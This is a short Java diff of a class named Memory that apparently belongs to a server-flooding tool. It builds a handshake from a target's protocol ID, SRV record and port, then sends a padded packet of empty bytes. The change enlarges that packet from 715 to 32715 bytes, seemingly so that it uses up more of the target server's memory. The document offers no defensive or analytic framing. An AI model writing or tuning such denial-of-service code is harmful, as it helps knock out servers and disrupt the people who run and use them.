@@ -19,7 +19,7 @@ public class Memory implements Method {
    public Memory() {
       this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
       this.bytes = this.handshake.getWrappedPacket();
-      this.emptyarray = new byte[715];
+      this.emptyarray = new byte[32715];
    }
 
    public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
@@ -37,7 +37,7 @@ public class Memory implements Method {
       ByteBufOutputStream out = new ByteBufOutputStream(b);
 
       try {
-         writeVarInt(out, 715);
+         writeVarInt(out, 32715);
          out.write(this.emptyarray);
          out.close();
       } catch (IOException var6) {
